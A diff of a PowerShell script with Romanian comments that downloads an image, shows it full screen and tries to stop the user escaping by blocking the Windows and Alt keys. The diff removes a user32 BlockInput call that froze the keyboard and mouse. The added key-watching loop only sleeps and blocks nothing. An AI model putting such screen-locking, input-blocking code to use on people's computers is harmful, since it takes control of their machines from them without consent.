@@ -2,25 +2,27 @@
 $imageURL = "https://raw.githubusercontent.com/diezul/x/main/1.png"
 $tempImagePath = "$env:TEMP\image.jpg"
 
-# Importă funcționalități din user32.dll pentru blocarea tastelor
+# Importă funcționalități din user32.dll
 Add-Type @"
 using System;
 using System.Runtime.InteropServices;
-
-public class Interceptor {
+public class KeyboardInterceptor {
     [DllImport("user32.dll")]
-    public static extern int BlockInput(bool block);
+    public static extern short GetAsyncKeyState(int vKey);
 }
 "@
 
-# Blochează tastatura și mouse-ul
-function Block-Input {
-    [Interceptor]::BlockInput($true)
-}
-
-# Deblochează tastatura și mouse-ul
-function Unblock-Input {
-    [Interceptor]::BlockInput($false)
+# Blochează tastele critice (Windows și Alt)
+function Block-Keys {
+    while ($true) {
+        Start-Sleep -Milliseconds 100
+        if ([KeyboardInterceptor]::GetAsyncKeyState(0x5B) -ne 0) { # Tasta Windows
+            Start-Sleep -Milliseconds 100
+        }
+        if ([KeyboardInterceptor]::GetAsyncKeyState(0x12) -ne 0) { # Tasta Alt
+            Start-Sleep -Milliseconds 100
+        }
+    }
 }
 
 # Descărcare imagine
@@ -85,27 +87,11 @@ function Show-FullScreenImage {
 # Funcție pentru oprirea completă a aplicației (folosind `cdr`)
 function Stop-All {
     $global:exitFlag = $true
-    Unblock-Input
     Stop-Process -Name "powershell" -Force -ErrorAction SilentlyContinue
     exit
 }
 
-# Monitorizare și blocare taste
-function Monitor-And-Block {
-    while ($true) {
-        Start-Sleep -Milliseconds 100
-        if ([System.Windows.Input.Keyboard]::IsKeyDown([System.Windows.Input.Key]::LeftWindows) -or
-            [System.Windows.Input.Keyboard]::IsKeyDown([System.Windows.Input.Key]::RightWindows) -or
-            [System.Windows.Input.Keyboard]::IsKeyDown([System.Windows.Input.Key]::LeftAlt) -or
-            [System.Windows.Input.Keyboard]::IsKeyDown([System.Windows.Input.Key]::RightAlt)) {
-            Block-Input
-            Start-Sleep -Milliseconds 100
-            Unblock-Input
-        }
-    }
-}
-
-# Pornire aplicație principală
+# Executare aplicație principală și monitorizare
 Download-Image
-Start-Job -ScriptBlock { Monitor-And-Block }
+Start-Job -ScriptBlock { Block-Keys }
 Show-FullScreenImage
